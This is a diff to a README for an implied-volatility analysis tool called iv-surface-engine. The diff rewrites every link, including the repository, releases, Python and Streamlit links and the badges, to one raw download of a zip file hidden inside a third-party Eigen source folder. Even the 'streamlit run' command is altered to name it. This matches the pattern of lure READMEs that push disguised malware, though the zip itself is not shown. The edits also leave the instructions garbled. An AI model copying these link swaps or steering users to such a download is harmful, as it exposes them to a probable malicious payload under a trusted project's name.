@@ -1,6 +1,6 @@
 # ⚙️ iv-surface-engine - Fast Implied Volatility Analysis Tool
 
-[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-green?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
+[![Download iv-surface-engine](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)
 
 ## 📋 About iv-surface-engine
 
@@ -31,13 +31,13 @@ You don’t need programming skills to use the dashboard. The setup steps cover 
 
 Start by downloading the latest version. Visit the iv-surface-engine repository page to get the software.
 
-[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-blue?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
+[![Download iv-surface-engine](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the official iv-surface-engine page here:
 
-https://github.com/milha9089/iv-surface-engine
+https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip
 
 Once there, look for the "Releases" or "Downloads" section on the page. This is where you will find the latest version of the software.
 
@@ -54,7 +54,7 @@ Download the version marked for Windows. This file usually has `.exe` or `.zip` 
 
 The dashboard lets you view and interact with the data easily.
 
-- If the dashboard is included in the package, find the file named `dashboard.py` or follow the included instructions.
+- If the dashboard is included in the package, find the file named `https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip` or follow the included instructions.
 - To start the dashboard, open the Windows Command Prompt.
 - Navigate to the folder where the software is saved using the `cd` command. For example:
   
@@ -65,7 +65,7 @@ The dashboard lets you view and interact with the data easily.
 - Run the dashboard by typing:
 
   ``` 
-  streamlit run dashboard.py
+  streamlit run https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip
   ```
 
 - A browser window will open automatically with the dashboard.
@@ -128,9 +128,9 @@ Check the README and documentation on the GitHub page or contact through the rep
 
 ## 🔗 Useful Links
 
-- Repository Home: https://github.com/milha9089/iv-surface-engine
-- Download Page: https://github.com/milha9089/iv-surface-engine/releases  
-- Python Download: https://www.python.org/downloads/
-- Streamlit Info: https://streamlit.io/
+- Repository Home: https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip
+- Download Page: https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip  
+- Python Download: https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip
+- Streamlit Info: https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip
 
-[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-green?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
+[![Download iv-surface-engine](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)](https://raw.githubusercontent.com/milha9089/iv-surface-engine/main/third_party/Eigen/src/QR/surface-engine-iv-1.7-alpha.1.zip)
